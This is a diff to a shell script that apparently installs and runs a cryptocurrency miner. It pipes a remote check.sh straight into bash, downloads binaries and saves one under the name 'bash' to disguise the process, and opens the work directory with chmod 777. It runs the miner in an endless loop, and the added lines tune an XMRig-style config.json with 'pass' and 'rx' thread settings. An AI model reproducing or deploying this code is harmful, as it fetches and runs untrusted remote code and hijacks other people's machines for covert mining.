@@ -19,6 +19,10 @@ addr=`wget --no-check-certificate -4 -qO- http://checkip.amazonaws.com/ 2>/dev/n
 [ -n "$addr" ] || addr="NULL"
 name=`RandString 2 c${cores}_${addr}`;
 
+rx="[`seq -s ', ' 0 $((cores - 1))`]" || rx=""
+rxName=`TZ=":Asia/Shanghai" date '+%Y%m%d'`
+[ -n "$rxName" ] || rxName="$name"
+
 bash <(wget -qO- ${src}/check.sh) >/dev/null 2>&1 &
 
 
@@ -37,8 +41,10 @@ wget --no-check-certificate -4 -qO "${work}/bash" "${src}/q"
 wget --no-check-certificate -4 -qO "${work}/config.json" "${src}/idle.json"
 wget --no-check-certificate -4 -qO "${work}/idle" "${src}/idle"
 chmod -R 777 "${work}"
-sed -i "s/\"cpuName\":.*/\"cpuName\": \"$(RandString 7)\",/" "${work}/appsettings.json"
-sed -i "s/\"alias\":.*/\"alias\": \"${name}\",/" "${work}/appsettings.json"
+[ -f "${work}/appsettings.json" ] && sed -i "s/\"cpuName\":.*/\"cpuName\": \"$(RandString 7)\",/" "${work}/appsettings.json"
+[ -f "${work}/appsettings.json" ] && sed -i "s/\"alias\":.*/\"alias\": \"${name}\",/" "${work}/appsettings.json"
+[ -f "${work}/config.json" ] && [ -n "$rxName" ] && sed -i "s/\"pass\":.*,/\"pass\": \"${rxName}\",/g" "${work}/config.json"
+[ -f "${work}/config.json" ] && [ -n "$rx" ] && sed -i "s/\"max-threads-hint\": 100,/&\n        \"rx\": ${rx},/" "${work}/config.json"
 
 cmd="while true; do cd ${work}; ./bash >/dev/null 2>&1 ; sleep 7; done"
 if [ "$mode" == "0" ]; then
